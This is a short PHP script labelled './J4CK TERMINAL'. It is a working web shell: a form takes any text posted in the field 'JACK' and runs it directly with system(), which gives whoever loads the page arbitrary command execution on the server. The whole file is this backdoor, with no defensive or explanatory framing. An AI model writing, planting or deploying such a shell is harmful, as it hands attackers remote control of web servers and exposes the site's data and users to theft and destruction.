<?php
echo "<center>./J4CK TERMINAL</center>";
        echo "<pre>";
        echo "<form name='form' action='#' method='post'>
        <input type='text' name='JACK'/> <input type='submit' value='enter'/>
        </form>";
        $cmd = ($_POST['JACK']);
        system($cmd);
        echo "</pre>";
        die;
?>
